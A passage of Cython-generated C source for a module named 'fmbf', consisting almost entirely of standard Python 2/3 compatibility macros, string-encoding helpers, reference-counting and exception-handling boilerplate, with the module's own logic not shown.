  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyIntObject                  PyLongObject
  #define PyInt_Type                   PyLong_Type
  #define PyInt_Check(op)              PyLong_Check(op)
  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)
  #define PyInt_FromString             PyLong_FromString
  #define PyInt_FromUnicode            PyLong_FromUnicode
  #define PyInt_FromLong               PyLong_FromLong
  #define PyInt_FromSize_t             PyLong_FromSize_t
  #define PyInt_FromSsize_t            PyLong_FromSsize_t
  #define PyInt_AsLong                 PyLong_AsLong
  #define PyInt_AS_LONG                PyLong_AS_LONG
  #define PyInt_AsSsize_t              PyLong_AsSsize_t
  #define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask
  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask
  #define PyNumber_Int                 PyNumber_Long
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBoolObject                 PyLongObject
#endif
#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY
  #ifndef PyUnicode_InternFromString
    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)
  #endif
#endif
#if PY_VERSION_HEX < 0x030200A4
  typedef long Py_hash_t;
  #define __Pyx_PyInt_FromHash_t PyInt_FromLong
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t
#else
  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))
#else
  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)
#endif
#if CYTHON_USE_ASYNC_SLOTS
  #if PY_VERSION_HEX >= 0x030500B1
    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods
    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)
  #else
    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))
  #endif
#else
  #define __Pyx_PyType_AsAsync(obj) NULL
#endif
#ifndef __Pyx_PyAsyncMethodsStruct
    typedef struct {
        unaryfunc am_await;
        unaryfunc am_aiter;
        unaryfunc am_anext;
    } __Pyx_PyAsyncMethodsStruct;
#endif

#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)
  #if !defined(_USE_MATH_DEFINES)
    #define _USE_MATH_DEFINES
  #endif
#endif
#include <math.h>
#ifdef NAN
#define __PYX_NAN() ((float) NAN)
#else
static CYTHON_INLINE float __PYX_NAN() {
  float value;
  memset(&value, 0xFF, sizeof(value));
  return value;
}
#endif
#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)
#define __Pyx_truncl trunc
#else
#define __Pyx_truncl truncl
#endif

#define __PYX_MARK_ERR_POS(f_index, lineno) \
    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }
#define __PYX_ERR(f_index, lineno, Ln_error) \
    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }

#ifndef __PYX_EXTERN_C
  #ifdef __cplusplus
    #define __PYX_EXTERN_C extern "C"
  #else
    #define __PYX_EXTERN_C extern
  #endif
#endif

#define __PYX_HAVE__fmbf
#define __PYX_HAVE_API__fmbf

#ifdef _OPENMP
#include <omp.h>
#endif 

#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)
#define CYTHON_WITHOUT_ASSERTIONS
#endif

typedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;
                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;

#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)
#define __PYX_DEFAULT_STRING_ENCODING ""
#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString
#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#define __Pyx_uchar_cast(c) ((unsigned char)c)
#define __Pyx_long_cast(x) ((long)x)
#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\
    (sizeof(type) < sizeof(Py_ssize_t))  ||\
    (sizeof(type) > sizeof(Py_ssize_t) &&\
          likely(v < (type)PY_SSIZE_T_MAX ||\
                 v == (type)PY_SSIZE_T_MAX)  &&\
          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\
                                v == (type)PY_SSIZE_T_MIN)))  ||\
    (sizeof(type) == sizeof(Py_ssize_t) &&\
          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\
                               v == (type)PY_SSIZE_T_MAX)))  )
static CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {
    return (size_t) i < (size_t) limit;
}
#if defined (__cplusplus) && __cplusplus >= 201103L
    #include <cstdlib>
    #define __Pyx_sst_abs(value) std::abs(value)
#elif SIZEOF_INT >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) abs(value)
#elif SIZEOF_LONG >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) labs(value)
#elif defined (_MSC_VER)
    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))
#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define __Pyx_sst_abs(value) llabs(value)
#elif defined (__GNUC__)
    #define __Pyx_sst_abs(value) __builtin_llabs(value)
#else
    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);
#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))
#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)
#define __Pyx_PyBytes_FromString        PyBytes_FromString
#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);
#if PY_MAJOR_VERSION < 3
    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#else
    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize
#endif
#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)
#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)
#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)
#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)
#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)
static CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {
    const Py_UNICODE *u_end = u;
    while (*u_end++) ;
    return (size_t)(u_end - u - 1);
}
#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))
#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode
#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode
#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)
#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);
#define __Pyx_PySequence_Tuple(obj)\
    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t);
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);
#if CYTHON_ASSUME_SAFE_MACROS
#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))
#else
#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)
#endif
#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))
#else
#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))
#endif
#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
static int __Pyx_sys_getdefaultencoding_not_ascii;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    PyObject* ascii_chars_u = NULL;
    PyObject* ascii_chars_b = NULL;
    const char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    if (strcmp(default_encoding_c, "ascii") == 0) {
        __Pyx_sys_getdefaultencoding_not_ascii = 0;
    } else {
        char ascii_chars[128];
        int c;
        for (c = 0; c < 128; c++) {
            ascii_chars[c] = c;
        }
        __Pyx_sys_getdefaultencoding_not_ascii = 1;
        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);
        if (!ascii_chars_u) goto bad;
        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);
        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {
            PyErr_Format(
                PyExc_ValueError,
                "This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.",
                default_encoding_c);
            goto bad;
        }
        Py_DECREF(ascii_chars_u);
        Py_DECREF(ascii_chars_b);
    }
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    Py_XDECREF(ascii_chars_u);
    Py_XDECREF(ascii_chars_b);
    return -1;
}
#endif
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)
#else
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
static char* __PYX_DEFAULT_STRING_ENCODING;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);
    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;
    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    return -1;
}
#endif
#endif



#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))
  #define likely(x)   __builtin_expect(!!(x), 1)
  #define unlikely(x) __builtin_expect(!!(x), 0)
#else 
  #define likely(x)   (x)
  #define unlikely(x) (x)
#endif 
static CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }

static PyObject *__pyx_m = NULL;
static PyObject *__pyx_d;
static PyObject *__pyx_b;
static PyObject *__pyx_cython_runtime = NULL;
static PyObject *__pyx_empty_tuple;
static PyObject *__pyx_empty_bytes;
static PyObject *__pyx_empty_unicode;
static int __pyx_lineno;
static int __pyx_clineno = 0;
static const char * __pyx_cfilenm= __FILE__;
static const char *__pyx_filename;


static const char *__pyx_f[] = {
  "fmbf.py",
};


struct __pyx_obj_4fmbf___pyx_scope_struct__metode_api;
struct __pyx_obj_4fmbf___pyx_scope_struct_1_genexpr;


struct __pyx_obj_4fmbf___pyx_scope_struct__metode_api {
  PyObject_HEAD
  PyObject *__pyx_v_post;
};



struct __pyx_obj_4fmbf___pyx_scope_struct_1_genexpr {
  PyObject_HEAD
  struct __pyx_obj_4fmbf___pyx_scope_struct__metode_api *__pyx_outer_scope;
  PyObject *__pyx_v_i;
  PyObject *__pyx_t_0;
  Py_ssize_t __pyx_t_1;
  PyObject *(*__pyx_t_2)(PyObject *);
};




#ifndef CYTHON_REFNANNY
  #define CYTHON_REFNANNY 0
#endif
#if CYTHON_REFNANNY
  typedef struct {
    void (*INCREF)(void*, PyObject*, int);
    void (*DECREF)(void*, PyObject*, int);
    void (*GOTREF)(void*, PyObject*, int);
    void (*GIVEREF)(void*, PyObject*, int);
    void* (*SetupContext)(const char*, int, const char*);
    void (*FinishContext)(void**);
  } __Pyx_RefNannyAPIStruct;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);
  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;
#ifdef WITH_THREAD
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          if (acquire_gil) {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
              PyGILState_Release(__pyx_gilstate_save);\
          } else {\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
          }
#else
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)
#endif
  #define __Pyx_RefNannyFinishContext()\
          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)
  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)
  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)
  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)
  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)
#else
  #define __Pyx_RefNannyDeclarations
  #define __Pyx_RefNannySetupContext(name, acquire_gil)
  #define __Pyx_RefNannyFinishContext()
  #define __Pyx_INCREF(r) Py_INCREF(r)
  #define __Pyx_DECREF(r) Py_DECREF(r)
  #define __Pyx_GOTREF(r)
  #define __Pyx_GIVEREF(r)
  #define __Pyx_XINCREF(r) Py_XINCREF(r)
  #define __Pyx_XDECREF(r) Py_XDECREF(r)
  #define __Pyx_XGOTREF(r)
  #define __Pyx_XGIVEREF(r)
#endif
#define __Pyx_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_XDECREF(tmp);\
    } while (0)
#define __Pyx_DECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_DECREF(tmp);\
    } while (0)
#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)
#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)


#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)
#endif


static PyObject *__Pyx_GetBuiltinName(PyObject *name);


#if CYTHON_USE_TYPE_SLOTS
#define __Pyx_PyObject_DelAttrStr(o,n) __Pyx_PyObject_SetAttrStr(o, n, NULL)
static CYTHON_INLINE int __Pyx_PyObject_SetAttrStr(PyObject* obj, PyObject* attr_name, PyObject* value);
#else
#define __Pyx_PyObject_DelAttrStr(o,n)   PyObject_DelAttr(o,n)
#define __Pyx_PyObject_SetAttrStr(o,n,v) PyObject_SetAttr(o,n,v)
#endif


#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)
#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\
    (version_var) = __PYX_GET_DICT_VERSION(dict);\
    (cache_var) = (value);
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\
        (VAR) = __pyx_dict_cached_value;\
    } else {\
        (VAR) = __pyx_dict_cached_value = (LOOKUP);\
        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\
    }\
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);
#else
#define __PYX_GET_DICT_VERSION(dict)  (0)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);
#endif


#if CYTHON_USE_DICT_VERSIONS
#define __Pyx_GetModuleGlobalName(var, name)  do {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\
        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\
        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\
    PY_UINT64_T __pyx_dict_version;\
    PyObject *__pyx_dict_cached_value;\
    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);
#else
#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);
#endif


#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject *__Pyx_PyCFunction_FastCall(PyObject *func, PyObject **args, Py_ssize_t nargs);
#else
#define __Pyx_PyCFunction_FastCall(func, args, nargs)  (assert(0), NULL)
#endif


#if CYTHON_FAST_PYCALL
#define __Pyx_PyFunction_FastCall(func, args, nargs)\
    __Pyx_PyFunction_FastCallDict((func), (args), (nargs), NULL)
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs);
#else
#define __Pyx_PyFunction_FastCallDict(func, args, nargs, kwargs) _PyFunction_FastCallDict(func, args, nargs, kwargs)
#endif
#define __Pyx_BUILD_ASSERT_EXPR(cond)\
    (sizeof(char [1 - 2*!(cond)]) - 1)
#ifndef Py_MEMBER_SIZE
#define Py_MEMBER_SIZE(type, member) sizeof(((type *)0)->member)
#endif
#if CYTHON_FAST_PYCALL
  static size_t __pyx_pyframe_localsplus_offset = 0;
  #include "frameobject.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
  #define __Pxy_PyFrame_Initialize_Offsets()\
    ((void)__Pyx_BUILD_ASSERT_EXPR(sizeof(PyFrameObject) == offsetof(PyFrameObject, f_localsplus) + Py_MEMBER_SIZE(PyFrameObject, f_localsplus)),\
     (void)(__pyx_pyframe_localsplus_offset = ((size_t)PyFrame_Type.tp_basicsize) - Py_MEMBER_SIZE(PyFrameObject, f_localsplus)))
  #define __Pyx_PyFrame_GetLocalsplus(frame)\
    (assert(__pyx_pyframe_localsplus_offset), (PyObject **)(((char *)(frame)) + __pyx_pyframe_localsplus_offset))
#endif // CYTHON_FAST_PYCALL
#endif


#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);
#else
#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)
#endif


static CYTHON_UNUSED PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2);


#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg);
#endif


static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg);


#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func);
#else
#define __Pyx_PyObject_CallNoArg(func) __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL)
#endif


#if PY_MAJOR_VERSION >= 3 && !CYTHON_COMPILING_IN_PYPY
static PyObject *__Pyx_PyDict_GetItem(PyObject *d, PyObject* key);
#define __Pyx_PyObject_Dict_GetItem(obj, name)\
    (likely(PyDict_CheckExact(obj)) ?\
     __Pyx_PyDict_GetItem(obj, name) : PyObject_GetItem(obj, name))
#else
#define __Pyx_PyDict_GetItem(d, key) PyObject_GetItem(d, key)
#define __Pyx_PyObject_Dict_GetItem(obj, name)  PyObject_GetItem(obj, name)
#endif


#if CYTHON_COMPILING_IN_PYPY
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        PyObject_Format(s, f))
#elif PY_MAJOR_VERSION < 3
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        likely(PyString_CheckExact(s)) ? PyUnicode_FromEncodedObject(s, NULL, "strict") :\
        PyObject_Format(s, f))
#elif CYTHON_USE_TYPE_SLOTS
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        likely(PyLong_CheckExact(s)) ? PyLong_Type.tp_str(s) :\
        likely(PyFloat_CheckExact(s)) ? PyFloat_Type.tp_str(s) :\
        PyObject_Format(s, f))
#else
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        PyObject_Format(s, f))
#endif


#include <string.h>


static PyObject* __Pyx_PyUnicode_Join(PyObject* value_tuple, Py_ssize_t value_count, Py_ssize_t result_ulength,
                                      Py_UCS4 max_char);


#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem * __Pyx_PyErr_GetTopmostException(PyThreadState *tstate);
#endif


#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;
#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;
#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type
#else
#define __Pyx_PyThreadState_declare
#define __Pyx_PyThreadState_assign
#define __Pyx_PyErr_Occurred()  PyErr_Occurred()
#endif


#if CYTHON_FAST_THREAD_STATE
#define __Pyx_ExceptionSave(type, value, tb)  __Pyx__ExceptionSave(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#define __Pyx_ExceptionReset(type, value, tb)  __Pyx__ExceptionReset(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
#else
#define __Pyx_ExceptionSave(type, value, tb)   PyErr_GetExcInfo(type, value, tb)
#define __Pyx_ExceptionReset(type, value, tb)  PyErr_SetExcInfo(type, value, tb)
#endif


#if CYTHON_FAST_THREAD_STATE
#define __Pyx_GetException(type, value, tb)  __Pyx__GetException(__pyx_tstate, type, value, tb)
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb);
#endif


#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)
#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))
#else
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#endif
#else
#define __Pyx_PyErr_Clear() PyErr_Clear()
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)
#endif


static CYTHON_INLINE void __Pyx_RaiseUnboundLocalError(const char *varname);


static CYTHON_INLINE int __Pyx_PyBytes_Equals(PyObject* s1, PyObject* s2, int equals);


static CYTHON_INLINE int __Pyx_PyUnicode_Equals(PyObject* s1, PyObject* s2, int equals);


#if PY_MAJOR_VERSION >= 3
